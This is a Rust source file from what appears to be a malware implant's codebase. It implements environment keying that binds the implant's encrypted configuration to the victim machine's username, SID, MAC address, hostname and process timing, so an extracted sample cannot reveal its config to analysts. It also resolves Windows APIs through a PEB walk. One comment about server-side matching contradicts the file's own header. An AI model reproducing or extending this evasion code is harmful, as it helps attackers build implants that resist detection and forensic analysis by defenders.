//! Environment keying — binds the per-implant config key to the target machine's
//! environment. If the implant is extracted and run on a different machine (or by
//! a different user, or at a different time), the config key derivation diverges and
//! AEAD decryption fails — the implant self-terminates without revealing its config.
//!
//! Layers are selected by a bitmap (`keying_levels` in the section header):
//!
//! | Bit | Layer      | Env data mixed into HKDF info              |
//! |-----|------------|--------------------------------------------|
//! | 0   | Username   | `GetUserNameW` result (UTF-8 bytes)        |
//! | 1   | MachineSid | Raw SID bytes from `GetTokenInformation`    |
//! | 2   | Network    | Primary MAC (6 B) + hostname fingerprint   |
//! | 3   | Temporal   | PID (4 B LE) + `GetTickCount64` (8 B LE)   |
//!
//! Each active layer runs HKDF-SHA256 in-place:
//!
//! ```text
//!   new_key = HKDF-SHA256(ikm=current_key, salt="nyx-env-layer-N", info=env_data)
//! ```
//!
//! Layers are applied in numeric order (Username → SID → Network → Temporal).
//! If env data cannot be read (PEB walk fails), that layer is **skipped gracefully**
//! — the key is still well-defined, just bound to fewer env factors.
//!
//! ## Runtime-only lock — NOT mirrored by the server
//!
//! These layers are a **pure runtime lock**: they mix in data only the target
//! machine knows at execution time (most critically the Temporal layer, which
//! includes `GetTickCount64` — a transient value no server can predict at
//! generation time). The server therefore **cannot** apply these layers when
//! encrypting the config, and so the generation endpoint rejects any non-zero
//! `keying` value with HTTP 400. Shipping an implant with `keying != 0` would
//! produce a beacon that can never decrypt its own config — a guaranteed dead
//! implant. Enabling env-keying requires a generation-side mechanism that does
//! not yet exist (e.g. operator-supplied static target factors); until then,
//! `keying_levels` stays 0 for all server-generated implants.

#![cfg(target_os = "windows")]

/// Layer selectors — match the `keying_levels` u32 in the `.nyx_cfg` section header.
pub const LAYER_USERNAME: u32 = 1 << 0;
pub const LAYER_MACHINE_SID: u32 = 1 << 1;
pub const LAYER_NETWORK: u32 = 1 << 2;
pub const LAYER_TEMPORAL: u32 = 1 << 3;

/// Apply environment keying layers to a 32-byte config key **in-place**.
///
/// Each active layer (selected by bits in `layers_bitmap`) chains HKDF-SHA256
/// over the current key, a fixed per-layer salt, and environment-specific info.
/// The HKDF output overwrites `key`, so later layers mix into the transformed key.
///
/// This function never fails — individual layers that cannot read their env data
/// are skipped silently. A missing factor weakens but does not break keying.
pub fn apply_layers(key: &mut [u8; 32], layers_bitmap: u32) {
    // Layer 1 — Username (bit 0)
    if layers_bitmap & LAYER_USERNAME != 0 {
        let username = crate::hostinfo::username();
        layer_hkdf(key, b"nyx-env-layer-1", username.as_bytes());
    }

    // Layer 2 — Machine SID (bit 1)
    if layers_bitmap & LAYER_MACHINE_SID != 0 {
        if let Some(sid) = crate::hostinfo::machine_sid() {
            layer_hkdf(key, b"nyx-env-layer-2", &sid);
        }
    }

    // Layer 3 — Network: primary MAC + hostname fingerprint (bit 2)
    if layers_bitmap & LAYER_NETWORK != 0 {
        if let Some(mac) = crate::hostinfo::primary_mac() {
            let host = crate::hostinfo::hostname();
            let hn = host.as_bytes();
            // Build info: 6 B MAC || first 10 B of hostname (or fewer if short).
            let mut info = [0u8; 16];
            info[..6].copy_from_slice(&mac);
            let n = hn.len().min(10);
            info[6..6 + n].copy_from_slice(&hn[..n]);
            layer_hkdf(key, b"nyx-env-layer-3", &info[..6 + n]);
        }
    }

    // Layer 4 — Temporal: PID + GetTickCount64 (bit 3)
    if layers_bitmap & LAYER_TEMPORAL != 0 {
        let pid = crate::hostinfo::pid();
        let tick = get_tick_count();
        let mut info = [0u8; 12];
        info[..4].copy_from_slice(&pid.to_le_bytes());
        info[4..12].copy_from_slice(&tick.to_le_bytes());
        layer_hkdf(key, b"nyx-env-layer-4", &info);
    }
}

// ── helpers ──────────────────────────────────────────────────────────────────

/// Single HKDF-SHA256 layer: `key = HKDF-SHA256(ikm=key, salt=salt, info=info)`.
///
/// The output buffer is a fixed 32 bytes — well under the 8160-byte HKDF-Expand
/// bound — so `OutputTooLong` is structurally unreachable here. We still avoid
/// `.expect()` (the pre-fix pattern) because this code runs under
/// `panic = "abort"`: on the (impossible) failure we zero the key rather than
/// abort the beacon. A zeroed key produces a deterministic (but useless)
/// downstream AEAD failure that the caller surfaces as a config-decrypt error
/// and exits cleanly — strictly better than tearing the process down with no
/// diagnostic.
fn layer_hkdf(key: &mut [u8; 32], salt: &[u8], info: &[u8]) {
    let mut out = [0u8; 32];
    if nyx_protocol::crypto::hkdf_sha256(key, salt, info, &mut out).is_err() {
        // Defensive: zero the key so a downstream AEAD failure is the visible
        // signal, not an abort. Reachable only if HKDF-Expand's bound is
        // violated, which the fixed 32-byte buffer structurally prevents.
        *key = [0u8; 32];
        return;
    }
    *key = out;
}

/// Resolve `GetTickCount64` from `kernel32.dll` via PEB walk.
/// Falls back to `KUSER_SHARED_DATA.TickCountLow` (u32 at `0x7FFE0320`) if
/// resolution fails — the server must match this fallback when generating the
/// implant config.
fn get_tick_count() -> u64 {
    type GetTickCount64 = unsafe extern "system" fn() -> u64;
    match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"GetTickCount64") } {
        Some(a) => {
            let f: GetTickCount64 = unsafe { core::mem::transmute(a) };
            unsafe { f() }
        }
        None => {
            // KUSER_SHARED_DATA TickCountLow — u32, wraps ~49.7 days.
            // Cast to u64 for info-buffer uniformity.
            unsafe {
                core::ptr::read_volatile((0x0000_0000_7FFE_0000usize + 0x320) as *const u32) as u64
            }
        }
    }
}
